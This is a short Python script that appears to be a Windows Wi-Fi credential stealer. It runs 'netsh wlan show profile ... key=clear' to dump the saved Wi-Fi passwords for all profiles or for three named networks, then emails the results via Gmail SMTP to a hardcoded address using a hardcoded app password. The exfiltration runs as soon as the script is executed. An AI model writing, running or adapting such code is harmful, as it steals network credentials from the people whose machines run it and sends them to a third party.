import subprocess,smtplib,re

def send_email(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()



def getwifi():
    command = "netsh wlan show profile "
    networks = subprocess.check_output(command, shell=True)
    networks = networks.decode(encoding='UTF-8')
    print(networks)
    network_name_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
    result=""
    result=str.encode(result)
    for network_name in network_name_list:
         command = "netsh wlan show profile "+network_name + " key=clear"
         result_current=subprocess.check_output(command,shell=True)
         result=result+result_current
         
    print(result)

def getwifi1():
    command = "netsh wlan show profile "
    networks = subprocess.check_output(command, shell=True)
    networks = networks.decode(encoding='UTF-8')
    print(networks)
    result=""
    result=str.encode(result)
    network_names = re.compile("r'(Profile\s*:\s)(.*)$").search(networks)
    command = "netsh wlan show profile "+"STU_1" + " key=clear"
    result_current=subprocess.check_output(command,shell=True)
    result=result+result_current
    
    command = "netsh wlan show profile "+"STU_2" + " key=clear"
    result_current=subprocess.check_output(command,shell=True)
    result=result+result_current
    
    command = "netsh wlan show profile "+"PM11" + " key=clear"
    result_current=subprocess.check_output(command,shell=True)
    result=result+result_current
    
    send_email("trankhoa515@gmail.com","efva dufh cvlu lfrz",result)

getwifi1()
